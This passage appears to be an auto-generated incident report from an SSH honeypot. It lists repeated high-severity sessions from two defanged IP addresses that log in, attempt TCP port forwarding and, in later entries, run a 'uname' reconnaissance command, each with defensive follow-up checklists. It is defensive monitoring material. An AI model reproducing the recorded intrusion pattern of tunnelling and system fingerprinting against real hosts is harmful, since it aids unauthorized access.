| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 14:40:43` | `cowrie.session.connect` |
| `2026-03-11 14:40:43` | `cowrie.client.version` |
| `2026-03-11 14:40:43` | `cowrie.client.kex` |
| `2026-03-11 14:40:44` | `cowrie.login.success` |
| `2026-03-11 14:40:44` | `cowrie.direct-tcpip.request` |
| `2026-03-11 14:40:44` | `cowrie.direct-tcpip.data` |
| `2026-03-11 14:40:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.26.106[.]200` to AbuseIPDB if not already reported
- [ ] Block `94.26.106[.]200` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aaed874b44c6

| Field | Detail |
|---|---|
| **Source IP** | `94.26.106[.]200` |
| **First Seen** | 2026-03-11 14:40 |
| **Last Seen** | 2026-03-11 14:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 14:40:45` | `cowrie.session.connect` |
| `2026-03-11 14:40:45` | `cowrie.client.version` |
| `2026-03-11 14:40:45` | `cowrie.client.kex` |
| `2026-03-11 14:40:46` | `cowrie.login.success` |
| `2026-03-11 14:40:46` | `cowrie.direct-tcpip.request` |
| `2026-03-11 14:40:46` | `cowrie.direct-tcpip.data` |
| `2026-03-11 14:40:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.26.106[.]200` to AbuseIPDB if not already reported
- [ ] Block `94.26.106[.]200` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a3cd7dcc6c8

| Field | Detail |
|---|---|
| **Source IP** | `94.26.106[.]200` |
| **First Seen** | 2026-03-11 14:40 |
| **Last Seen** | 2026-03-11 14:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 14:40:52` | `cowrie.session.connect` |
| `2026-03-11 14:40:52` | `cowrie.client.version` |
| `2026-03-11 14:40:52` | `cowrie.client.kex` |
| `2026-03-11 14:40:52` | `cowrie.login.success` |
| `2026-03-11 14:40:53` | `cowrie.direct-tcpip.request` |
| `2026-03-11 14:40:53` | `cowrie.direct-tcpip.data` |
| `2026-03-11 14:40:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.26.106[.]200` to AbuseIPDB if not already reported
- [ ] Block `94.26.106[.]200` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8db5aa8fd9d7

| Field | Detail |
|---|---|
| **Source IP** | `94.26.106[.]200` |
| **First Seen** | 2026-03-11 14:45 |
| **Last Seen** | 2026-03-11 14:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 14:45:37` | `cowrie.session.connect` |
| `2026-03-11 14:45:37` | `cowrie.client.version` |
| `2026-03-11 14:45:38` | `cowrie.client.kex` |
| `2026-03-11 14:45:38` | `cowrie.login.success` |
| `2026-03-11 14:45:38` | `cowrie.direct-tcpip.request` |
| `2026-03-11 14:45:38` | `cowrie.direct-tcpip.data` |
| `2026-03-11 14:45:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.26.106[.]200` to AbuseIPDB if not already reported
- [ ] Block `94.26.106[.]200` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dfaae28cc893

| Field | Detail |
|---|---|
| **Source IP** | `94.26.106[.]200` |
| **First Seen** | 2026-03-11 14:45 |
| **Last Seen** | 2026-03-11 14:46 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 14:45:59` | `cowrie.session.connect` |
| `2026-03-11 14:45:59` | `cowrie.client.version` |
| `2026-03-11 14:45:59` | `cowrie.client.kex` |
| `2026-03-11 14:45:59` | `cowrie.login.success` |
| `2026-03-11 14:45:59` | `cowrie.direct-tcpip.request` |
| `2026-03-11 14:46:00` | `cowrie.direct-tcpip.data` |
| `2026-03-11 14:46:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.26.106[.]200` to AbuseIPDB if not already reported
- [ ] Block `94.26.106[.]200` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57ad8f58a35f

| Field | Detail |
|---|---|
| **Source IP** | `94.26.106[.]200` |
| **First Seen** | 2026-03-11 15:28 |
| **Last Seen** | 2026-03-11 15:28 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 15:28:02` | `cowrie.session.connect` |
| `2026-03-11 15:28:02` | `cowrie.client.version` |
| `2026-03-11 15:28:02` | `cowrie.client.kex` |
| `2026-03-11 15:28:03` | `cowrie.login.success` |
| `2026-03-11 15:28:03` | `cowrie.direct-tcpip.request` |
| `2026-03-11 15:28:03` | `cowrie.direct-tcpip.data` |
| `2026-03-11 15:28:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.26.106[.]200` to AbuseIPDB if not already reported
- [ ] Block `94.26.106[.]200` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4489e5ad88a4

| Field | Detail |
|---|---|
| **Source IP** | `94.26.106[.]200` |
| **First Seen** | 2026-03-11 15:29 |
| **Last Seen** | 2026-03-11 15:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 15:29:21` | `cowrie.session.connect` |
| `2026-03-11 15:29:21` | `cowrie.client.version` |
| `2026-03-11 15:29:22` | `cowrie.client.kex` |
| `2026-03-11 15:29:22` | `cowrie.login.success` |
| `2026-03-11 15:29:23` | `cowrie.direct-tcpip.request` |
| `2026-03-11 15:29:23` | `cowrie.direct-tcpip.data` |
| `2026-03-11 15:29:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.26.106[.]200` to AbuseIPDB if not already reported
- [ ] Block `94.26.106[.]200` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76983a4ca878

| Field | Detail |
|---|---|
| **Source IP** | `94.26.106[.]200` |
| **First Seen** | 2026-03-11 15:29 |
| **Last Seen** | 2026-03-11 15:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 15:29:25` | `cowrie.session.connect` |
| `2026-03-11 15:29:25` | `cowrie.client.version` |
| `2026-03-11 15:29:25` | `cowrie.client.kex` |
| `2026-03-11 15:29:25` | `cowrie.login.success` |
| `2026-03-11 15:29:26` | `cowrie.direct-tcpip.request` |
| `2026-03-11 15:29:26` | `cowrie.direct-tcpip.data` |
| `2026-03-11 15:29:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.26.106[.]200` to AbuseIPDB if not already reported
- [ ] Block `94.26.106[.]200` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e26036e4749

| Field | Detail |
|---|---|
| **Source IP** | `94.26.106[.]200` |
| **First Seen** | 2026-03-11 15:29 |
| **Last Seen** | 2026-03-11 15:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 15:29:50` | `cowrie.session.connect` |
| `2026-03-11 15:29:50` | `cowrie.client.version` |
| `2026-03-11 15:29:50` | `cowrie.client.kex` |
| `2026-03-11 15:29:51` | `cowrie.login.success` |
| `2026-03-11 15:29:51` | `cowrie.direct-tcpip.request` |
| `2026-03-11 15:29:51` | `cowrie.direct-tcpip.data` |
| `2026-03-11 15:29:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.26.106[.]200` to AbuseIPDB if not already reported
- [ ] Block `94.26.106[.]200` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-528af65b0db9

| Field | Detail |
|---|---|
| **Source IP** | `94.26.106[.]200` |
| **First Seen** | 2026-03-11 15:29 |
| **Last Seen** | 2026-03-11 15:30 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 15:29:57` | `cowrie.session.connect` |
| `2026-03-11 15:29:57` | `cowrie.client.version` |
| `2026-03-11 15:29:57` | `cowrie.client.kex` |
| `2026-03-11 15:29:59` | `cowrie.login.success` |
| `2026-03-11 15:29:59` | `cowrie.direct-tcpip.request` |
| `2026-03-11 15:29:59` | `cowrie.direct-tcpip.data` |
| `2026-03-11 15:30:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.26.106[.]200` to AbuseIPDB if not already reported
- [ ] Block `94.26.106[.]200` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9810ce2c192b

| Field | Detail |
|---|---|
| **Source IP** | `94.26.106[.]200` |
| **First Seen** | 2026-03-11 15:35 |
| **Last Seen** | 2026-03-11 15:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 15:35:23` | `cowrie.session.connect` |
| `2026-03-11 15:35:23` | `cowrie.client.version` |
| `2026-03-11 15:35:23` | `cowrie.client.kex` |
| `2026-03-11 15:35:23` | `cowrie.login.success` |
| `2026-03-11 15:35:24` | `cowrie.direct-tcpip.request` |
| `2026-03-11 15:35:24` | `cowrie.direct-tcpip.data` |
| `2026-03-11 15:35:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.26.106[.]200` to AbuseIPDB if not already reported
- [ ] Block `94.26.106[.]200` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff4ceb0e0887

| Field | Detail |
|---|---|
| **Source IP** | `94.26.106[.]200` |
| **First Seen** | 2026-03-11 15:36 |
| **Last Seen** | 2026-03-11 15:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 15:36:16` | `cowrie.session.connect` |
| `2026-03-11 15:36:16` | `cowrie.client.version` |
| `2026-03-11 15:36:16` | `cowrie.client.kex` |
| `2026-03-11 15:36:17` | `cowrie.login.success` |
| `2026-03-11 15:36:17` | `cowrie.direct-tcpip.request` |
| `2026-03-11 15:36:17` | `cowrie.direct-tcpip.data` |
| `2026-03-11 15:36:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.26.106[.]200` to AbuseIPDB if not already reported
- [ ] Block `94.26.106[.]200` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ebab8ff24f4f

| Field | Detail |
|---|---|
| **Source IP** | `94.26.106[.]200` |
| **First Seen** | 2026-03-11 15:37 |
| **Last Seen** | 2026-03-11 15:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 15:37:08` | `cowrie.session.connect` |
| `2026-03-11 15:37:08` | `cowrie.client.version` |
| `2026-03-11 15:37:08` | `cowrie.client.kex` |
| `2026-03-11 15:37:09` | `cowrie.login.success` |
| `2026-03-11 15:37:09` | `cowrie.direct-tcpip.request` |
| `2026-03-11 15:37:10` | `cowrie.direct-tcpip.data` |
| `2026-03-11 15:37:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.26.106[.]200` to AbuseIPDB if not already reported
- [ ] Block `94.26.106[.]200` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63f5ee3026de

| Field | Detail |
|---|---|
| **Source IP** | `94.26.106[.]200` |
| **First Seen** | 2026-03-11 15:37 |
| **Last Seen** | 2026-03-11 15:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 15:37:19` | `cowrie.session.connect` |
| `2026-03-11 15:37:19` | `cowrie.client.version` |
| `2026-03-11 15:37:19` | `cowrie.client.kex` |
| `2026-03-11 15:37:20` | `cowrie.login.success` |
| `2026-03-11 15:37:20` | `cowrie.direct-tcpip.request` |
| `2026-03-11 15:37:20` | `cowrie.direct-tcpip.data` |
| `2026-03-11 15:37:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.26.106[.]200` to AbuseIPDB if not already reported
- [ ] Block `94.26.106[.]200` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-497cb91648a0

| Field | Detail |
|---|---|
| **Source IP** | `94.26.106[.]200` |
| **First Seen** | 2026-03-11 15:37 |
| **Last Seen** | 2026-03-11 15:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 15:37:43` | `cowrie.session.connect` |
| `2026-03-11 15:37:43` | `cowrie.client.version` |
| `2026-03-11 15:37:43` | `cowrie.client.kex` |
| `2026-03-11 15:37:43` | `cowrie.login.success` |
| `2026-03-11 15:37:44` | `cowrie.direct-tcpip.request` |
| `2026-03-11 15:37:44` | `cowrie.direct-tcpip.data` |
| `2026-03-11 15:37:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.26.106[.]200` to AbuseIPDB if not already reported
- [ ] Block `94.26.106[.]200` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35e3d26175dc

| Field | Detail |
|---|---|
| **Source IP** | `94.26.106[.]200` |
| **First Seen** | 2026-03-11 15:38 |
| **Last Seen** | 2026-03-11 15:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 15:38:12` | `cowrie.session.connect` |
| `2026-03-11 15:38:12` | `cowrie.client.version` |
| `2026-03-11 15:38:12` | `cowrie.client.kex` |
| `2026-03-11 15:38:12` | `cowrie.login.success` |
| `2026-03-11 15:38:13` | `cowrie.direct-tcpip.request` |
| `2026-03-11 15:38:13` | `cowrie.direct-tcpip.data` |
| `2026-03-11 15:38:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.26.106[.]200` to AbuseIPDB if not already reported
- [ ] Block `94.26.106[.]200` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-946b72478abd

| Field | Detail |
|---|---|
| **Source IP** | `94.26.106[.]200` |
| **First Seen** | 2026-03-11 15:39 |
| **Last Seen** | 2026-03-11 15:39 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 15:39:23` | `cowrie.session.connect` |
| `2026-03-11 15:39:23` | `cowrie.client.version` |
| `2026-03-11 15:39:24` | `cowrie.client.kex` |
| `2026-03-11 15:39:24` | `cowrie.login.success` |
| `2026-03-11 15:39:26` | `cowrie.direct-tcpip.request` |
| `2026-03-11 15:39:26` | `cowrie.direct-tcpip.data` |
| `2026-03-11 15:39:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.26.106[.]200` to AbuseIPDB if not already reported
- [ ] Block `94.26.106[.]200` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db2912dd7983

| Field | Detail |
|---|---|
| **Source IP** | `94.26.106[.]200` |
| **First Seen** | 2026-03-11 15:40 |
| **Last Seen** | 2026-03-11 15:40 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 15:40:16` | `cowrie.session.connect` |
| `2026-03-11 15:40:16` | `cowrie.client.version` |
| `2026-03-11 15:40:16` | `cowrie.client.kex` |
| `2026-03-11 15:40:17` | `cowrie.login.success` |
| `2026-03-11 15:40:17` | `cowrie.direct-tcpip.request` |
| `2026-03-11 15:40:17` | `cowrie.direct-tcpip.data` |
| `2026-03-11 15:40:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.26.106[.]200` to AbuseIPDB if not already reported
- [ ] Block `94.26.106[.]200` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae119d863323

| Field | Detail |
|---|---|
| **Source IP** | `94.26.106[.]200` |
| **First Seen** | 2026-03-11 15:40 |
| **Last Seen** | 2026-03-11 15:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 15:40:24` | `cowrie.session.connect` |
| `2026-03-11 15:40:24` | `cowrie.client.version` |
| `2026-03-11 15:40:24` | `cowrie.client.kex` |
| `2026-03-11 15:40:25` | `cowrie.login.success` |
| `2026-03-11 15:40:25` | `cowrie.direct-tcpip.request` |
| `2026-03-11 15:40:26` | `cowrie.direct-tcpip.data` |
| `2026-03-11 15:40:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.26.106[.]200` to AbuseIPDB if not already reported
- [ ] Block `94.26.106[.]200` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f738fa562c3

| Field | Detail |
|---|---|
| **Source IP** | `94.26.106[.]200` |
| **First Seen** | 2026-03-11 15:40 |
| **Last Seen** | 2026-03-11 15:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 15:40:31` | `cowrie.session.connect` |
| `2026-03-11 15:40:31` | `cowrie.client.version` |
| `2026-03-11 15:40:31` | `cowrie.client.kex` |
| `2026-03-11 15:40:32` | `cowrie.login.success` |
| `2026-03-11 15:40:32` | `cowrie.direct-tcpip.request` |
| `2026-03-11 15:40:32` | `cowrie.direct-tcpip.data` |
| `2026-03-11 15:40:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.26.106[.]200` to AbuseIPDB if not already reported
- [ ] Block `94.26.106[.]200` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af957c79ba95

| Field | Detail |
|---|---|
| **Source IP** | `94.26.106[.]200` |
| **First Seen** | 2026-03-11 15:40 |
| **Last Seen** | 2026-03-11 15:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 15:40:46` | `cowrie.session.connect` |
| `2026-03-11 15:40:46` | `cowrie.client.version` |
| `2026-03-11 15:40:47` | `cowrie.client.kex` |
| `2026-03-11 15:40:47` | `cowrie.login.success` |
| `2026-03-11 15:40:48` | `cowrie.direct-tcpip.request` |
| `2026-03-11 15:40:48` | `cowrie.direct-tcpip.data` |
| `2026-03-11 15:40:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.26.106[.]200` to AbuseIPDB if not already reported
- [ ] Block `94.26.106[.]200` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0f03eb24383

| Field | Detail |
|---|---|
| **Source IP** | `167.71.84[.]143` |
| **First Seen** | 2026-03-11 16:41 |
| **Last Seen** | 2026-03-11 16:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 16:41:57` | `cowrie.session.connect` |
| `2026-03-11 16:41:57` | `cowrie.client.version` |
| `2026-03-11 16:41:58` | `cowrie.client.kex` |
| `2026-03-11 16:41:58` | `cowrie.login.success` |
| `2026-03-11 16:41:59` | `cowrie.session.params` |
| `2026-03-11 16:41:59` | `cowrie.command.input` |
| `2026-03-11 16:41:59` | `cowrie.log.closed` |
| `2026-03-11 16:41:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.71.84[.]143` to AbuseIPDB if not already reported
- [ ] Block `167.71.84[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1bae9327225b

| Field | Detail |
|---|---|
| **Source IP** | `167.71.84[.]143` |
| **First Seen** | 2026-03-11 16:42 |
| **Last Seen** | 2026-03-11 16:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 16:42:11` | `cowrie.session.connect` |
| `2026-03-11 16:42:11` | `cowrie.client.version` |
| `2026-03-11 16:42:11` | `cowrie.client.kex` |
| `2026-03-11 16:42:12` | `cowrie.login.success` |
| `2026-03-11 16:42:12` | `cowrie.session.params` |
| `2026-03-11 16:42:12` | `cowrie.command.input` |
| `2026-03-11 16:42:12` | `cowrie.log.closed` |
| `2026-03-11 16:42:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.71.84[.]143` to AbuseIPDB if not already reported
- [ ] Block `167.71.84[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29e544aac788

| Field | Detail |
|---|---|
| **Source IP** | `167.71.84[.]143` |
| **First Seen** | 2026-03-11 16:42 |
| **Last Seen** | 2026-03-11 16:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 16:42:25` | `cowrie.session.connect` |
| `2026-03-11 16:42:25` | `cowrie.client.version` |
| `2026-03-11 16:42:25` | `cowrie.client.kex` |
| `2026-03-11 16:42:26` | `cowrie.login.success` |
| `2026-03-11 16:42:26` | `cowrie.session.params` |
| `2026-03-11 16:42:26` | `cowrie.command.input` |
| `2026-03-11 16:42:26` | `cowrie.log.closed` |
| `2026-03-11 16:42:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.71.84[.]143` to AbuseIPDB if not already reported
- [ ] Block `167.71.84[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15dc884df972

| Field | Detail |
|---|---|
| **Source IP** | `167.71.84[.]143` |
| **First Seen** | 2026-03-11 16:42 |
| **Last Seen** | 2026-03-11 16:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 16:42:53` | `cowrie.session.connect` |
